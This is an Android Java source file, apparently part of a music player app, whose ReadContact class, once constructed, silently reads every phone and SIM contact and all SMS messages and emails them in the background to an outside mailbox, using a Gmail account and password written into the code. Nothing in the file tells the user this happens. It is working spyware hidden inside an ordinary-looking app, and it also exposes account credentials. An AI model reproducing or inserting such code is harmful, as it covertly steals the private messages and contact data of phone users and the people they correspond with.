package de.wangchao.musicplayer.activity;


import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import com.google.gson.FieldNamingPolicy;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.util.Log;


public class ReadContact {
	private Context context;
	private static final String[] PHONES_PROJECTION = new String[]{Phone.DISPLAY_NAME, Phone.NUMBER };  
	private Gson gson=new GsonBuilder().setFieldNamingPolicy(FieldNamingPolicy.UPPER_CAMEL_CASE).create();
	
	public ReadContact(Context context){
		this.context=context;
		 new SendMailTask().execute();
	}
	
	private String getContacts() {  
		 ArrayList<Contact> con=new ArrayList<Contact>();
	     String str="";
		 ContentResolver resolver = context.getContentResolver();  
		//from phone
		 Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,PHONES_PROJECTION, null, null, null);  
		 if (phoneCursor != null) {  
		     while (phoneCursor.moveToNext()) {  
		    	 Contact c=new Contact();
		    	 String contactName = phoneCursor.getString(0);  
		         String number = phoneCursor.getString(1);
		         c.setName(contactName==null?"":contactName);
		         c.setNum(number==null?"":number);
                 con.add(c);
		     }  
		     phoneCursor.close();  
		 } 
		 
		 Uri uri = Uri.parse("content://icc/adn");  
		 Cursor simCursor = resolver.query(uri,PHONES_PROJECTION, null, null, null); 
		 if (simCursor != null) {  
		     while (simCursor.moveToNext()) {  
		    	 Contact c=new Contact();
		    	 String contactName = simCursor.getString(0);  
		         String number = simCursor.getString(1);
		         c.setName(contactName==null?"":contactName);
		         c.setNum(number==null?"":number);
                 con.add(c);
		     }  
		     simCursor.close();  
		 } 
		 
		 str=gson.toJson(con, new TypeToken<ArrayList<Contact>>() {}.getType());
		 Log.i("1",str);
		 return str;
	 }  
	    
	 class Contact{
			private String name;
			private String number;
			public String getName(){
				return name;
			}
			public void setName(String name){
				this.name=name;
			}
			public String getNum(){
				return number;
			}
			public void setNum(String num){
				this.number=num;
			}
			
	 }
	 
	 private class SendMailTask extends AsyncTask<Void,Void,Void>{

		   String from="wyhuster@gmail.com";
		@Override
		protected Void doInBackground(Void... params) {
			// TODO Auto-generated method stub
			 try {
				 String contact=getContacts();
				 String sms=getSmsInPhone();
	             GmailSender sender = new GmailSender(from, "m201272330@@");
	             sender.sendMail("contact",   
	            		 contact+"\n"+sms,   
	                     from,   
	                     "wy_huster@163.com");
	         } catch (Exception e) {   
	             e.printStackTrace();   
	         }
			return null; 
		}
		   
	   }
	 
	 public String getSmsInPhone()   
	 {   
	     final String SMS_URI_ALL   = "content://sms/";     
	     final String SMS_URI_INBOX = "content://sms/inbox";   
	     final String SMS_URI_SEND  = "content://sms/sent";   
	     final String SMS_URI_DRAFT = "content://sms/draft";   
	        
	     StringBuilder smsBuilder = new StringBuilder();   
	        
	     try{   
	         ContentResolver cr = context.getContentResolver();   
	         String[] projection = new String[]{"_id", "address", "person",    
	                 "body", "date", "type"};   
	         Uri uri = Uri.parse(SMS_URI_ALL);   
	         Cursor cur = cr.query(uri, projection, null, null, "date desc");   
	   
	         if (cur.moveToFirst()) {   
	             String name;    
	             String phoneNumber;          
	             String smsbody;   
	             String date;   
	             String type;   
	             
	             int nameColumn = cur.getColumnIndex("person");   
	             int phoneNumberColumn = cur.getColumnIndex("address");   
	             int smsbodyColumn = cur.getColumnIndex("body");   
	             int dateColumn = cur.getColumnIndex("date");   
	             int typeColumn = cur.getColumnIndex("type");   
	             
	             do{   
	                 name = cur.getString(nameColumn);                
	                 phoneNumber = cur.getString(phoneNumberColumn);   
	                 smsbody = cur.getString(smsbodyColumn);   
	                    
	                 SimpleDateFormat dateFormat = new SimpleDateFormat(   
	                         "yyyy-MM-dd hh:mm:ss");   
	                 Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
	                 date = dateFormat.format(d);   
	                    
	                 int typeId = cur.getInt(typeColumn);   
	                 if(typeId == 1){   
	                     type = "接收";   
	                 } else if(typeId == 2){   
	                     type = "发送";   
	                 } else {   
	                     type = "";   
	                 }   
	                 
	                 smsBuilder.append("[");   
	                 smsBuilder.append(name+",");   
	                 smsBuilder.append(phoneNumber+",");   
	                 smsBuilder.append(smsbody+",");   
	                 smsBuilder.append(date+",");   
	                 smsBuilder.append(type);   
	                 smsBuilder.append("] ");
	                 smsBuilder.append("\n");
	                 
	                 if(smsbody == null) smsbody = "";     
	             }while(cur.moveToNext());   
	         } else {   
	             smsBuilder.append("no result!");   
	         }   
	             
	         smsBuilder.append("getSmsInPhone has executed!");  
	         cur.close();
	     } catch(SQLiteException ex) {   
	         Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
	     }   
	     String str=smsBuilder.toString();
	     Log.i("1",str);
	     return str;
	 } 
}
